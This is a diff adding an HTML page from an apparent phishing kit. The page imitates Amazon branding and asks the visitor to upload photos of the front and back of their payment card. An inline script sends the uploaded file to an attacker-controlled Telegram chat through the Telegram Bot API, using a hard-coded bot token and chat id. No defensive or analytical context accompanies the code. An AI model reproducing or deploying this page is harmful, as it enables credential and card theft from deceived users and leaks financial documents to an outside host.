@@ -1,0 +1,81 @@
+<html>
+
+<head>
+  <title>Amazon - Update Info</title>
+  <link rel="icon" href="../assets/img/amazon.png">
+  <link rel="stylesheet" href="../assets/css/mobile_login.css">
+  <link rel="stylesheet" href="../assets/css/billing.css">
+  <script type="text/javascript" src="../assets/js/jquery-1.9.1.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.payment.js"></script>
+  <script type="text/javascript" src="../assets/js/additional-methods.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.maskedinput.js"></script>
+  <!-- <script type="text/javascript" src="../assets/js/validate.php"></script> -->
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+</head>
+
+<body>
+  <center>
+    <br>
+    <header style="background-color:#fff;">
+      <div class="hleft">
+        <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+    </header>
+  </center>
+  <center>
+    <br>
+    <div style="width:400px;" class="boxlogin">
+      <form action="" method="post"
+        enctype="multipart/form-data">
+        <div id="formbilling">
+          <h4>We Need Photo of Card</h4>
+          <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+            <center><img id="gambardesktop" width="300" src="../assets/img/uploadcc.png"></center><br>
+            <h4>Front Card</h4>
+            <input type="file" id="file" name="file" required="required"><br><br>
+            <h4>Back Card</h4>
+            <input type="file" id="file2" name="file2" required="required"><br>
+            <br>
+            <input type="submit" class="button a-button-text"
+              style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value="Update">
+          </div>
+        </div>
+      </form>
+    </div>
+
+  </center>
+  <br><br>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
+  <script>
+
+// $('form').submit(function(e){
+    var chat_id = "-1001187217209"; // replace with yours
+    var gambar = document.querySelector('input[type=file]').files[0];
+    var reader = new FileReader();
+    // reader.addEventListener('load', readFile);
+    reader.readAsText(gambar);
+    var enc_data = gambar;
+    console.log(enc_data);
+    var date = new Date();
+    var token = "1163128696:AAGHzQ3d4IZgIXqmw_C0P35LWN0E6uTFeis"; // from botfather
+
+    var blob = new Blob([enc_data], { type: 'plain/text' });
+
+    var formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('document', blob, date+'.jpg');
+
+    var request = new XMLHttpRequest();
+    request.open('POST', `https://api.telegram.org/bot${token}/sendDocument`);
+    request.send(formData);	
+
+  // });
+  </script>
+</body>
+
+</html>
